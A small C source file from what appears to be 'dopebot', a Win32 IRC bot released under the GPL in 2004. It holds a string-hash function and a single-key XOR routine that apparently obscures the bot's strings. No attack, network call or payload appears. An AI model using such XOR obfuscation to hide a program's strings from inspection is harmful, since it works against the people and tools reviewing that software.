/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_CRYPTO
#include "bot.h"

//Hash String
DWORD hash(char *szString)
{
	DWORD dwHash = 0, dwStore;

#ifndef NO_DEBUG
		printf("[DEBUG] Hashing, hash()...\n");
#endif

	while (*szString)
	{
			dwHash = (dwHash << 4) + *szString++;
		if (dwStore = dwHash & 0xF0000000)
			dwHash ^= dwStore >> 24;
			dwHash &= ~dwStore;
	}
		return dwHash;
}

//XOR String
void xor(char *szString, int szKey)
{
	int i, length;
	if (szString == NULL) return;

#ifndef NO_DEBUG
		printf("[DEBUG] xoring, xor()...\n");
#endif

		length = strlen(szString);
	for (i = 0; i < length; i++)
	{
			*szString ^= szKey;
			szString++;
	}
		return;
}
#endif